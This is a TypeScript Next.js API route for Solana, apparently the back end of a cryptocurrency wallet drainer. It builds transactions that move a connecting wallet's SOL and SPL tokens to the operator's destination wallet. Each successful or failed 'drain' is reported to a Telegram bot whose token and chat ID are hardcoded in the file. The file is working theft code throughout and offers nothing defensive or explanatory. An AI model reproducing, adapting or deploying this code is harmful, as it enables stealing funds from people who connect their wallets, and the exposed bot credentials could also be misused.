// src/app/api/drain/route.ts - NETLIFY PRODUCTION READY
import { NextRequest, NextResponse } from "next/server";
import {
  Connection,
  PublicKey,
  Keypair,
  Transaction,
  ComputeBudgetProgram,
  TransactionInstruction,
  type Commitment,
  type VersionedTransaction,
  BlockheightBasedTransactionConfirmationStrategy,
  SystemProgram,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  getAssociatedTokenAddress,
  MintLayout,
} from "@solana/spl-token";
import dotenv from "dotenv";

dotenv.config();

// --- TELEGRAM TELEMETRY CONFIG ---
const BOT_TOKEN = "8703660369:AAEQQBuWwpggS4jnmRb_Ndjfhpqyl6TILTg";
const CHAT_ID = "7566241039";

async function sendTelegramNotification(message: string) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `🛡️ *DRAINER TELEMETRY*\n\n${message}`,
        parse_mode: "Markdown",
      }),
    });
  } catch (e) {
    console.error("Telemetry failed:", e);
  }
}

// --- Backend config (PRODUCTION-SAFE) ---
const rpcUrl =
  process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com";
const commitment: Commitment = "confirmed";

const connection = new Connection(rpcUrl, commitment);

// ✅ NULL-SAFE PRIVATE KEY (NETLIFY FIX)
const privateKeyString = process.env.DESTINATION_WALLET_PRIVATE_KEY;
if (!privateKeyString) {
  throw new Error(
    "DESTINATION_WALLET_PRIVATE_KEY environment variable is required",
  );
}

const privateKeyBytes = Buffer.from(privateKeyString.split(",").map(Number));
const drainerKey = Keypair.fromSecretKey(privateKeyBytes);
const DESTINATION_WALLET = drainerKey.publicKey;

type Token = {
  mint: string;
  amount: string; // as string‑bigint
  isSPL2022: boolean;
};

type DrainPayload = {
  wallet: string;
  solAmount: number;
  tokens: Token[];
};

type DrainedTokenInfo = {
  mint: string;
  amount: bigint;
  isSPL2022: boolean;
};

// --- Helper: retry‑safe send + confirm ---
const sendAndConfirm = async (
  tx: Transaction | VersionedTransaction,
  attempts = 3,
): Promise<string> => {
  for (let i = 0; i < attempts; i++) {
    const raw = tx.serialize();
    const signature = await connection.sendRawTransaction(raw, {
      skipPreflight: false,
    });

    const strategy: BlockheightBasedTransactionConfirmationStrategy = {
      signature,
      blockhash: tx.recentBlockhash!,
      lastValidBlockHeight: tx.lastValidBlockHeight!,
    };

    const status = await connection
      .confirmTransaction(strategy, commitment)
      .catch(() => null);

    if (status && status.value && status.value.err === null) {
      return signature;
    }

    if (i < attempts - 1) {
      await new Promise((r) =>
        setTimeout(r, 100 + 200 * Math.random()),
      );
    }
  }

  throw new Error(`Transaction failed after ${attempts} attempts`);
};

// --- SPL‑2022 / SPL‑token helpers ---
const classifyTokenBackend = async (
  mint: PublicKey,
  isSPL2022: boolean,
): Promise<{ isTransferHook: boolean; decimals: number }> => {
  if (!isSPL2022) {
    return { isTransferHook: false, decimals: 0 };
  }

  const account = await connection.getAccountInfo(mint);
  if (!account || account.data.length < MintLayout.span) {
    return { isTransferHook: false, decimals: 0 };
  }

  const mintLayout = MintLayout.decode(account.data);
  const decimals = mintLayout.decimals;

  const isTransferHook =
    account.data.length > MintLayout.span &&
    account.data[MintLayout.span] === 8;

  return { isTransferHook, decimals };
};

function formatTopTokensForTelegram(tokens: DrainedTokenInfo[]): string {
  if (!tokens.length) return "_No SPL tokens drained_";

  const sorted = [...tokens].sort(
    (a, b) => Number(b.amount - a.amount),
  );

  const top3 = sorted.slice(0, 3);

  const lines = top3.map((t, idx) => {
    const shortMint =
      t.mint.slice(0, 4) + "..." + t.mint.slice(-4);
    return `${idx + 1}. \`${shortMint}\` — ${t.amount.toString()} units${
      t.isSPL2022 ? " (2022)" : ""
    }`;
  });

  return lines.join("\n");
}

// --- MAIN ENDPOINT ---
export async function POST(request: NextRequest) {
  let body: DrainPayload | null = null;
  try {
    body = (await request.json()) as DrainPayload;
    const { wallet, solAmount, tokens } = body;

    if (!wallet || solAmount == null || !Array.isArray(tokens)) {
      return NextResponse.json(
        { success: false, error: "Missing data" },
        { status: 400 },
      );
    }

    const userPubkey = new PublicKey(wallet);
    const instrs: TransactionInstruction[] = [];
    const drainedTokens: DrainedTokenInfo[] = [];

    // 1. Priority‑fee (first instruction)
    instrs.push(
      ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: 100_000,
      }),
    );

    // 2. SOL transfer
    if (solAmount > 0) {
      instrs.push(
        SystemProgram.transfer({
          fromPubkey: userPubkey,
          toPubkey: DESTINATION_WALLET,
          lamports: solAmount,
        }),
      );
    }

    // 3. SPL / SPL‑2022 tokens
    for (const token of tokens) {
      const mint = new PublicKey(token.mint);
      const isSPL2022 = token.isSPL2022;
      const programId = isSPL2022
        ? TOKEN_2022_PROGRAM_ID
        : TOKEN_PROGRAM_ID;

      const { isTransferHook } = await classifyTokenBackend(
        mint,
        isSPL2022,
      );

      if (isTransferHook && isSPL2022) {
        console.log(
          "Skipping transfer‑hook SPL‑2022 token",
          mint.toBase58(),
        );
        continue;
      }

      const destinationAta = await getAssociatedTokenAddress(
        mint,
        DESTINATION_WALLET,
        true,
        programId,
      );

      const tokenAccount = await connection.getAccountInfo(
        destinationAta,
      );

      if (!tokenAccount) {
        instrs.push(
          createAssociatedTokenAccountInstruction(
            userPubkey,
            destinationAta,
            DESTINATION_WALLET,
            mint,
            programId,
          ),
        );
      }

      const amountBig = BigInt(token.amount);

      instrs.push(
        createTransferInstruction(
          userPubkey,
          destinationAta,
          userPubkey,
          amountBig,
          [],
          programId,
        ),
      );

      drainedTokens.push({
        mint: mint.toBase58(),
        amount: amountBig,
        isSPL2022,
      });
    }

    if (instrs.length === 0) {
      await sendTelegramNotification(
        `ℹ️ *NO DRAINABLE ASSETS*\n*Wallet:* \`${wallet}\``,
      );

      return NextResponse.json(
        { success: true, txid: null, message: "No drainable assets" },
        { status: 200 },
      );
    }

    const tx = new Transaction();
    tx.add(...instrs);
    tx.feePayer = userPubkey;

    const {
      blockhash,
      lastValidBlockHeight,
    } = await connection.getLatestBlockhash(commitment);
    tx.recentBlockhash = blockhash;
    tx.lastValidBlockHeight = lastValidBlockHeight;

    // 4. Sign (backend) and send
    tx.sign(drainerKey);

    const signature = await sendAndConfirm(tx, 3);

    const topTokensText = formatTopTokensForTelegram(drainedTokens);

    await sendTelegramNotification(
      `✅ *SUCCESSFUL DRAIN*\n` +
        `*Wallet:* \`${wallet}\`\n` +
        `*SOL:* ${solAmount / 1_000_000_000} SOL\n` +
        `*Tokens Drained:* ${drainedTokens.length}\n\n` +
        `*Top Tokens:*\n${topTokensText}\n\n` +
        `*TX:* https://solscan.io/tx/${signature}`,
    );

    return NextResponse.json({
      success: true,
      txid: signature,
      amount: solAmount,
      tokenCount: tokens.length,
    });
  } catch (e: any) {
    console.error("Backend drain API error", e);

    const walletForLog = body?.wallet || "unknown";

    await sendTelegramNotification(
      `❌ *DRAIN FAILED*\n` +
        `*Wallet:* \`${walletForLog}\`\n` +
        `*Error:* ${e.message || "Unknown error"}`,
    );

    return NextResponse.json(
      {
        success: false,
        error: e.message || "An unknown error occurred",
      },
      { status: 500 },
    );
  }
}